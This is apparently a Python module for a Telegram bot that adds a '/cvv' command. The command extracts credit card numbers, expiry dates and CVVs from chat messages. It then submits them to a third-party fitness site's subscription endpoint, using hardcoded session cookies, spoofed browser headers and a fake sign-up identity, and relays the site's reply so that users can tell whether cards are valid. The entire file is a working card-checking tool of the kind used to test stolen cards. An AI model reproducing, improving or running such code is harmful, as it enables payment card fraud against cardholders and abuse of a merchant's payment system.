import re
import requests
import time
from pyrogram import Client, filters
from EQUROBOT import app

# Function to extract credit card details from the message text
def extract_credit_card_details(message_text):
    cards = []
    input = re.findall(r"[0-9]+", message_text)
    
    if not input or len(input) < 3:
        return cards
    
    if len(input) == 3:
        cc = input[0]
        if len(input[1]) == 3:
            mes = input[2][:2]
            ano = input[2][2:]
            cvv = input[1]
        else:
            mes = input[1][:2]
            ano = input[1][2:]
            cvv = input[2]
    else:
        cc = input[0]
        if len(input[1]) == 3:
            mes = input[2]
            ano = input[3]
            cvv = input[1]
        else:
            mes = input[1]
            ano = input[2]
            cvv = input[3]

    if len(mes) != 2 or not (1 <= int(mes) <= 12):
        return cards

    if len(cvv) not in [3, 4]:
        return cards

    cards.append([cc, mes, ano, cvv])
    return cards

# Command to check credit card details
@app.on_message(filters.command("cvv", prefixes=[".", "/"]))
async def check_cc(client, message):
    command_prefix_length = len(message.text.split()[0])
    cc = message.text[command_prefix_length:].strip()
    
    reply_msg = message.reply_to_message
    if reply_msg:
        cc_in_backticks = re.findall(r'`([^`]*)`', reply_msg.text)
        if cc_in_backticks:
            cc = cc_in_backticks[0].strip()
        else:
            cc = reply_msg.text.strip()

    cards = extract_credit_card_details(cc)
    
    if not cards:
        return await message.reply_text('Invalid CC format or details.')

    ccn, mm, yy, cvv = cards[0]

    if not (len(ccn) in [13, 15, 16] and len(mm) == 2 and len(yy) in [2, 4] and len(cvv) in [3, 4]):
        return await message.reply_text('Invalid CC details. Check the format and values.')

    VALID_PREFIXES = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
    if not ccn.startswith(VALID_PREFIXES):
        return await message.reply_text('Invalid CC type')

    reply = await message.reply_text('Processing your request...')

    cookies = {
        '_gcl_au': '1.1.355957066.1718880093',
        '_ga': 'GA1.1.1315831686.1718880093',
        'optiMonkClientId': '8e208f7c-eaf7-cfd3-e65a-776249b40307',
        'ci_session': '31qd8h80hgpiuslcs2ud36seqp9bklio',
        '_ga_4HXMJ7D3T6': 'GS1.1.1718895011.2.1.1718895012.0.0.0',
        '_ga_KQ5ZJRZGQR': 'GS1.1.1718895011.2.1.1718895179.0.0.0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.lagreeod.com',
        'priority': 'u=1, i',
        'referer': 'https://www.lagreeod.com/subscribe',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'stripe_customer': '',
        'subscription_type': 'Monthly Subscription',
        'firstname': 'warrior ',
        'lastname': 'losy',
        'email': 'koyllels@gmail.com',
        'password': 'kikikikiki',
        'card[name]': 'Warrior',
        'card[number]': ccn,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'card[cvc]': cvv,
        'coupon': '',
        's1': '10',
        'sum': '28',
    }

    response = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers, data=data)
    text = response.text
    
    # Handle response based on your requirements
    await reply.delete()  # Delete the processing message
    await message.reply_text(text)  # Reply with the API response

